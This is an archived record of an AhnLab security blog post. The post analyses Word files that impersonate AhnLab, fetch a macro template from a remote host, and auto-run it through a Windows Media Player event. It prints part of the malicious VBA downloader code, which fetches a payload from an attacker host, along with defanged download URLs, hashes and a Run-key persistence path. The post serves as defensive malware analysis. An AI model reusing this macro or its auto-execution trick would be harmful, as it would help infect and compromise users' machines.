{
    "id": "0b4f46ea-c1de-4497-82f5-58e25c46b14c",
    "created_at": "2023-01-12T15:04:35.970983Z",
    "updated_at": "2025-03-27T02:05:52.135011Z",
    "deleted_at": null,
    "sha1_hash": "f5b2853abd0b6ad75d236d819ad2994e2259889b",
    "title": "2022-04-05 - Malicious Word Documents Using MS Media Player (Impersonating AhnLab)",
    "authors": "",
    "file_creation_date": "2022-05-28T23:24:21Z",
    "file_modification_date": "2022-05-28T23:24:21Z",
    "file_size": 741879,
    "plain_text": "# Malicious Word Documents Using MS Media Player (Impersonating AhnLab)\n\n**asec.ahnlab.com/en/33477/**\n\nApril 5, 2022\n\nLast week, the ASEC analysis team uploaded a post named “Malicious Word File\n**Targeting Corporate Users Being Distributed” that contained information about a**\nmalicious Word file. Currently, documents of the same type are being distributed with text\nthat impersonates AhnLab. The Word files confirmed this time download another Word file\ncontaining malicious VBA macro via the external URL and run it. Another difference is that\nthe additionally downloaded Word file uses the Windows Media Player() function instead of\nAutoOpen() to automatically run the VBA macro. It appears the attackers adopted a measure\nto bypass anti-malware products that detect automatic execution of the AutoOpen() functionbased macro.\n\nThe confirmed filenames are as follows:\n\n– NFT split.docx\n\n– 202203_BTC_ETH_additional account info.docx\n\n– Complaint for fund-raising business without permission.docx\n\n– Fund-raising without permission.docx\n\n– BTC_ETH automated trading account info.docx\n\n– Cryptocurrency_investment plan.docx\nUpon running the Word file, a Word macro (dotm) file is downloaded via the external URL in\nthe word\\ rels\\settings xml rels file and executed\n\n\n-----\n\nFigure 1. Inside settings.xml.rels\n\nFigure 2. Word file attempting\n\nto access external URL\nThe downloaded file contains a macro as shown below. The attacker inserted an image and\ntext to prompt users to press Enable Content.\n\nFigure 3. Word file content\nWhen users click Enable Content, the malicious VBA macro that exists inside the externallydownloaded Word file is run.\n\nThe macro is written using the WindowsMediaPlayer1_OpenStateChange() function instead\nof AutoOpen() that was used in the previously detected Word documents. This function is\nexecuted when the openState property of the Windows Media Player object changes. When\nit is run, it performs malicious activities via the RunFE() function just like in previous cases.\nThe following shows a part of the VBA macro code.\n\n\n-----\n\n```\nPrivate Function RunFE() As Long\n  Dim MR As Object\n  Dim bbb As String\n  Dim i As Long\n  Randomize\n  Call Init\n  For i = 0 To 8: bbb = bbb & Chr(Map1(Int(62 * Rnd()))): Next i\n  Set MR = CreateObject(DecodeSTR(\"tw7v/v2UF6/h4I4v9cL5sgLww+yTE6+Dp9E=\"))\n'WinHttp.WinHttpRequest.5.1\n  Call MR.SetTimeouts(0, 2000, 2000, 5000)\n  #If Win64 Then\n    MR.Open \"GET\",\nDecodeSTR(\"iBP1xrPPSNvg6tEO6/fczgngwOyJBO7f+YNJ9dPqiEjA9cSzSLHa/64myof9z1ftwMehLLDCv9R\n & \"?\" & bbb & \"=\" & bbb\n'hxxp://ZVc1ijAU.naveicoipc[.]tech/ACMS/0lvNAK1t/0lvNAK1t64.acm\n  #Else\n    MR.Open \"GET\",\nDecodeSTR(\"iBP1xrPPSNvg6tEO6/fczgngwOyJBO7f+YNJ9dPqiEjA9cSzSLHa/64myof9z1ftwMehLLDCutJ\n & \"?\" & bbb & \"=\" & bbb \n'hxxp://ZVc1ijAU.naveicoipc[.]tech/ACMS/0lvNAK1t/0lvNAK1t32.acm\n  #End If\n<생략>\nPrivate Sub WindowsMediaPlayer1_OpenStateChange(ByVal NewState As Long)\n  If bFlag = False Then\n    Call CTD\n    Dim rfRes As Long\n    rfRes = RunFE()\n    If rfRes = 1 Then\n      bFlag = True\n    End If\n  End If\nEnd Sub\n\n```\nOpening the Word document downloaded through the external URL shows Windows Media\nPlayer within the file. The file contains Windows Media Player named WindowsMediaPlayer1\nas shown below.\n\n\n-----\n\nFigure 4. Inside the additionally downloaded Word file\nThe attacker enabled the AutoPlay option for the Player so that the\nWindowsMediaPlayer1_OpenStateChange() function is automatically run. When the Player\nis run, WindowsMediaPlayer1_OpenStateChange() inside the VBA macro is executed,\ncommencing malicious activities even if the user does not perform additional tasks for the\nPlayer. Ultimately, as the attacker set the Player to run automatically, the malicious macro is\nautomatically run when the user clicks the Enable Content button.\n\nFigure 5. Inside word\\activeX\\activeX1.xml\n\n\n-----\n\nFigure 6. WindowsMediaPlayer1’s properties\nMalicious activities that are performed by the macro code are the same as those explained in\nthe previous blog post. It downloads additional malware that suits the user’s PC environment\nand runs it after injecting it into the Word process.\n\nDownload URL\n\n– X86 environment: hxxp://ZVc1ijAU.naveicoipc[.]tech/ACMS/0lvNAK1t/0lvNAK1t32.acm\n\n– X64 environment: hxxp://ZVc1ijAU.naveicoipc[.]tech/ACMS/0lvNAK1t/0lvNAK1t64.acm\n\nAfterward, it drops USOService.exe into the %ProgramData%\\USOShared\\Logs folder and\nruns it. Then it adds the file as\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WUService registry so that it can be\ncontinuously run.\n\n\n-----\n\nFigure 7. Created executable\nThe dotm file that was downloaded from the external URL of the additionally confirmed Word\ndocument ‘Complaint for fund-raising business without permission.docx’ creates the\nmessage box shown below if the macro is enabled. The Word file creates a malicious file\nnamed UpdateChecker.exe into the \\AppData\\Local\\Microsoft\\Office\\ folder. It seems that the\nattacker drops malware in various folders including the %ProgramData% folder.\n\nFigure 8. Message box that appears when successfully accessing download URL\n\n\n-----\n\nFigure 9. Message box that appears when failed to access download URL\nAttacks using Word files are being continuously discovered recently. As seen from the cases\nimpersonating AhnLab to prompt users to enable macros, the attackers are using various\nimages and content to trick people. One should take caution when enabling content for the\nfile.\n\nAhnLab’s anti-malware software, V3, is currently detecting and blocking the files using the\nfollowing aliases.\n\n**[File Detection]**\n\nDownloader/DOC.Akdoor\n\nDownloadaer/XML.Generic\n\nTrojan/Win.Generic.C5025270\n\n**[IOC]**\n\nce00749c908de017010055a83ac0654f\n\n783e7c3ba39daa28301b841785794d76\n\n2fec0c6ff8af4484471633aeaa1c9996\n\n6df608342938f0d30a058c48bb9d8d4d\n\nhxxp://ZVc1ijAU.naveicoipc[.]tech/ACMS/0lvNAK1t/0lvNAK1t32.acm\n\nhxxp://ZVc1ijAU.naveicoipc[.]tech/ACMS/0lvNAK1t/0lvNAK1t64.acm\n\nhxxp://naveicoipc[.]tech/ACMS/0nXbQs2e/topAccounts?uid=rt6i45sd\n\nhxxp://naveicoipd[.]tech/ACMS/018ueCdS/blockchainTemplate\n\nhxxp://bcvbert.naveicoipe[.]tech/ACMS/01AweT9Z/wwwTemplate?uid=glvrdta\n\nhxxp://wrhehdfg.naveicoipe[.]tech/ACMS/0TQyKdO9/accountTemplate0330?\nvvvid=rehs4344s\n\n\n-----\n\nhxxp://msldkopw.naveicoipe[.]tech/ACMS/0TQyKdO9/accountTemplate03301?\nvvvid=zxzdfherh\nhxxp://uktyukb.naveicoipe[.]tech/ACMS/0TQyKdO9/accountTemplate03304?vvvid=cvnrturr\n[hxxp://gowelknx.naveicoipf[.]online/ACMS/07RRwrwK/securityTemplate0?](https://asec.ahnlab.com/en/33477/)\nsecurityID=ffsdwiefwe\nhxxp://xjowihgnxcvb.naveicoipf[.]online/ACMS/07RRwrwK/securityTemplate3?\nsecurityID=cbvkoweoigwk\n\n**Subscribe to AhnLab’s next-generation threat intelligence platform ‘AhnLab TIP’ to**\n**check related IOC and detailed analysis information.**\n\n[Categories:Malware Information](https://asec.ahnlab.com/en/category/malware-information/)\n\n[Tagged as:VBA Macro,](https://asec.ahnlab.com/tag/vba-macro/) [Word](https://asec.ahnlab.com/en/tag/word-en/)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-04-05 - Malicious Word Documents Using MS Media Player (Impersonating AhnLab).pdf"
    ],
    "report_names": [
        "2022-04-05 - Malicious Word Documents Using MS Media Player (Impersonating AhnLab).pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535875,
    "ts_updated_at": 1743041152,
    "ts_creation_date": 1653780261,
    "ts_modification_date": 1653780261,
    "files": {
        "pdf": "https://archive.orkl.eu/f5b2853abd0b6ad75d236d819ad2994e2259889b.pdf",
        "text": "https://archive.orkl.eu/f5b2853abd0b6ad75d236d819ad2994e2259889b.txt",
        "img": "https://archive.orkl.eu/f5b2853abd0b6ad75d236d819ad2994e2259889b.jpg"
    }
}